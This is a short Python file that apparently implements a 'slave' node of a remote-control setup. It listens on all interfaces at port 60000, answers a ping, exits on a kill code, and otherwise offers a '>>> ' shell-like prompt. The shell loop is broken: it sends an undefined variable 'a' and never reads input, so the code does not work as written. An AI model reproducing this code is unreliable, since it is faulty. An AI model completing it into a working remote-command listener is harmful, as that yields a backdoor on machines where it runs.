from utils.socks import Server,Log
import socket

class SlaveServer(Server) :
    def handle_io(self,cl,addr) :
        client = cl 
        cmd = client.recv(self.ReadBuffer).decode()
        print(f"Command {cmd}")
        if cmd == "ping" :
            print(Log("Ping Check"))
        elif cmd == "kill" :
            print(Log("Kill Code Received"))
            print(Log("Slave Exiting"))
            self.running = False
        else :
            while True :
                try :
                    client.send(">>> ".encode())
                    client.send(a)
                    if 'exit' in a.decode() :
                        client.close()
                        break
                except OSError :
                    print(Log("OSError {}".format(addr)))
                    client.close()
                    break
                except BaseException as e :
                    print(Log("{} cause by {}".format(e,addr)))
                    break
                finally :
                    print(Log("Connection with {} terminated".format(addr)))

slave = SlaveServer(addr=("0.0.0.0",60000))
slave.start()